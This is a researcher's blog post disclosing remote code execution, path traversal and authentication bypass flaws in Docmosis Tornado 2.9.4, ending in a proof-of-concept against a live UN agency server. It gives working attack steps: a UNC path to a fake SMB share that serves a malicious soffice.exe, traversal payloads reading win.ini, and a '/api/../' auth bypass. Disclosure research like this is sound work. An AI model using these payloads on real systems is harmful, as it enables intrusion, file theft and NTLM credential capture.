---
layout: post
title:  "Using 0days to Protect the United Nations"
date:   2023-01-25 01:00:00 +0200
categories: vulns4free
---

Recently, I did a non-exhaustive security product review on a Document Generator Engine, named **Docmosis**. A system I targeted used **[Docmosis Tornado](https://www.docmosis.com/products/tornado/)** in its latest version **2.9.4**. I'll give you a walkthrough based on my local lab installation with a Proof-of-Concept exploitation on an on-premises system belonging to a specialized agency of the United Nations.

![tornado](/assets/images/docmosis/docmosisreport14.png)

By default, no login is needed to access the web UI :-0. But as we'll see, even if the password protection is enabled/configured, there is an **Authentication Bypass** which makes all these findings exploitable from an **unauthenticated context** as well. But let's go through all the findings step by step.

## Remote Code Execution

This first vulnerability relies on the fact that the web UI field **"Open/Libre Office location"** can be changed, pointing to the *LibreOffice* installation directory. All configuration changes are persisted after the corresponding *GWT-based* HTTP POST request is sent to `/webserverdownload/configure`. The corresponding URL mapping can be found in the web descriptor `web.xml`.

```xml
<servlet-mapping>
  <servlet-name>ConfigurationServlet</servlet-name>
  <url-pattern>/webserverdownload/configure</url-pattern>
</servlet-mapping>
...
<servlet>
  <servlet-name>ConfigurationServlet</servlet-name>
  <servlet-class>com.docmosis.webserver.server.ConfigurationServiceImpl</servlet-class>
</servlet>
```

The responsible Java interface extends `com.google.gwt.user.server.rpc.RemoteServiceServlet`, finally leading to the implementing class `com.docmosis.webserver.server.ConfigurationServiceImpl`. The method `com.docmosis.webserver.server.ConfigurationServiceImpl.saveConfiguration(ConfigBean)` is called then with the parameters given in the request. There exists a validation method `com.docmosis.webserver.server.ConfigurationServiceImpl.serverSideValidate(ConfigBean)` which checks access to the Office location directory. 

```java
String[] expectedFolders = DMProperties.getStringArray("docmosis.openoffice.location.binary.searchpath", ";");
boolean subFolderFound = false;
for (String expected : expectedFolders) {
  File subFolder = new File(officePathFile, expected);
  if (subFolder.canRead() && subFolder.isDirectory()) {
    subFolderFound = true;
    
    break;
  } 
} 
```

The `expectedFolders` member seems to be used to check for expected folders matching a valid Office installation. The same is done for the Template directories etc. No further validations with respect to security are done. On a standard Windows installation, an **UNC network share path** could be used to point the Office directory to a remote host.
The Office executable `soffice.exe` is used for converter functions etc. and therefore is observable in the process tree of Docmosis Tornado after being started.

![processtree](/assets/images/docmosis/docmosisreport2.png)

Now, changing the **Open/Libre Office location** value to a remote network share path allows to load an **arbitrary malicious .exe file** named `soffice.exe` instead. After a restart of Docmosis Tornado, this would be fetched and executed, allowing an attacker to executing arbitrary code on the targeted machine. This already is a critical vulnerability in itself but **requires user interaction** on the server-side for the *restart*. **The web UI does not provide any restart functions**. Looking again at the GWT service implementation, we find the method `com.docmosis.webserver.server.ConfigurationServiceImpl.restartServer()` which indeed allows exactly this via a properly crafted GWT HTTP request. This makes the **user interaction restriction obsolete**. To following steps have to be taken to prove the Remote Code Execution (RCE).

* We create a "malicious" `soffice.exe` file with a C cross compiler with the following code underneath.

```
void main()
{
	system("cmd.exe /C calc");
}
```

* We mimick the directory/file structure of a valid LibreOffice installation on our remote attacker server.

* We provide a fake SMB server with help of [the impacket suite](https://github.com/fortra/impacket).

* We change the Office location in the web UI pointing to this server `\\10.137.0.16\myshare\LibreOffice`.

![changepath](/assets/images/docmosis/docmosisreport15.png)

* We observe NTLM authentication on our fake SMB server.

![ntlmauth](/assets/images/docmosis/docmosisreport4.png)

* We trigger the restart of the Tornado service and got code execution, i.e. our malicious `soffice.exe` got executed, popping a Windows calculator.

![calc](/assets/images/docmosis/docmosisreport5.png)

Since the targeted server uses NTLM authentication to login to the attacker's fake SMB server, this could of course be used to capture the **NetNTLM hash**. This hash could be cracked offline, so finally an attacker would have had valid Windows credentials to access the server via other channels.

## Multiple Path Traversals - File Read

In general, no proper validation of file system operations with respect to traversal attacks can be found. This allows various attack vectors leading to file disclosure out of the context directories specified within the Tornado application.

### Restricted File Read

First, we show a file read primitive with a few restrictions for the attacker. The **"Source Templates From"** directory is set to `C:\Users\user\Desktop\templates` in our lab environment.

![templatefolder](/assets/images/docmosis/docmosisreport6.png)

Using the function *"Creating dummy data based on template"* in the web UI fills the *Data* text field automatically so afterwards we can click the *Test* button to create e.g. a PDF file. Next to our `templates` directory, mentioned above, we put a file with fake secret data `C:\Users\user\Desktop\secretfolder\secret.txt`. Now the request is intercepted and a path traversal payload injected into the template reference path.

![traversal1](/assets/images/docmosis/docmosisreport7.png)

Indeed, the generated document contains the content of the secret file: a file located at a completely different folder than `C:\Users\user\Desktop\templates`.

![disclosure1](/assets/images/docmosis/docmosisreport8.png)

This seems at least be restricted to certain file types but nevertheless is a juicy vulnerability.

### Full File Read

The most dangerous path traversal vulnerability originates from the service call to `/fetch?filename=[SOME_NAME].pdf`. This is called after we generated the PDF file above to automatically download the file content from the server.

![download](/assets/images/docmosis/docmosisreport9.png)

The corresponding implementation can be found in `com.docmosis.webserver.servlet.FetchTmp.doGet(HttpServletRequest, HttpServletResponse)`. The `filename` request parameter is used within a String concatenation to retrieve the file.

```java
filename = request.getParameter("filename");
filename = System.getProperty("java.io.tmpdir") + "/" + filename;
```

This allows an attacker to again introduce relative path segments, giving access to arbitrary files on the server file system. Here, we show reading the file `C:\Windows\win.ini`.

![traversal2](/assets/images/docmosis/docmosisreport10.png)

## Authentication Bypass

Even though, the default installation does not require an *Admin password* being set, the web UI indeed provides a configuration field. To test this, we set a password, clicked the logout button and indeed are redirected to the login page.

![loginpage](/assets/images/docmosis/docmosisreport11.png)

Also our full file read vulnerability now cannot be exploited anymore from an unauthenticated content (*still exploitable as authenticated user, though*). 

![traversalfail](/assets/images/docmosis/docmosisreport12.png)

Looking at the web descriptor file `web.xml` reveals that an authentication filter is set in place for all URI paths.

```xml
<filter-mapping>
	<filter-name>AuthenticatedCheckFilter</filter-name>
	<url-pattern>/*</url-pattern>
</filter-mapping> 
```

Every request has to go through the Java Servlet filter `com.docmosis.webserver.servlet.AuthenticatedCheckServlet.doFilter(ServletRequest, ServletResponse, FilterChain)`.
Surprisingly, the authentication check can be bypassed to reach the final `chain.doFilter(request, response)` call. Responsible for this is the following code path:

```java
if (!authenticated) // [1]
{
  if (!isRestCall) { // [2]



    
    WebServerPreferences prefs = WebServerPreferencesStore.getPrefs();
    boolean authenticationRequired = !StringUtilities.isEmpty(prefs.getAdminPassword());
    
    if (authenticationRequired) { // [3]
      
      if (isGWTRPCCall) {
        
        ((HttpServletResponse)response).sendError(401); return;
      } 
      if (!this.authPostUrl.equals(req.getRequestURI())) {
        
        RequestDispatcher rd = req.getRequestDispatcher("/authenticate.jsp");
        rd.forward(request, response);

        
        return;
      } 
    }
} 
```

At [1], it is properly checked if the user is already authenticated. If not, the `if` branch is entered. If this request is not part of a REST call [2] and an Admin password is set [3], then access is denied. The problem now relies in the check if `isRestCall` is `true/false`.

```java
boolean isRestCall = req.getRequestURI().startsWith("/api/")
```

Our path traversal attack e.g. `/fetch?filename=../../../../../Windows/win.ini` indeed does not start with `/api` but at this point of HTTP request processing, a simple bypass is possible due to using the `startsWith` String method.
Using an URI path with relative path segments like `/api/../fetch?filename=../../../../../Windows/win.ini` bypasses the authentication check and triggers the file read primitive again.

![bypass](/assets/images/docmosis/docmosisreport13.png)

## Internet Exposure Check

These findings were shared with the vendor and they released **[version 2.9.5](https://resources.docmosis.com/content/documentation/tornado-v2-9-5-release-notes)** to address these issues (I did not validate the patches, though). Checking the exposure rate of this software on the public Internet, one of the systems found was **[REDACTED].upu.int**. Even though, this instance was not using the latest version, the same vulnerabilities still worked fine.

As it turned out, this system belongs to the **[Universal Postal Union (UPU)](https://www.upu.int/en/home)**, a specialized agency of the United Nations (UN). Additionally, this system seemed to be part of the official UPU network, i.e. no cloud-hosted instance but rather an entry point to the network of UPU.

![whois](/assets/images/docmosis/weltpost7_2.png)

The system exposed a web UI of Docmosis Tornado with default configurations, i.e. no authentication needed at all. Even if authentication would have been needed, we already found an **Authentication Bypass**.

![exposure](/assets/images/docmosis/weltpost4_2.png)

To prove the system to be vulnerable, we read the content of `C:\Windows\win.ini` and provided the report as quickly as possible. 

![poc](/assets/images/docmosis/weltpost6_2.png)

## Acknowledgements

Many thanks to [Carlos](https://twitter.com/f00bar_) from [UNICC](https://www.unicc.org/) to forward my requests to UPU quickly. Also the Docmosis team communicated fast and professionally.

P.S.: I'm pretty sure there're more vulnerabilities in this product. Go, practice and responsibly disclose issues to the Docmosis team. Maybe you'll find a deserialization vulnerability somewhere *\*hint\**.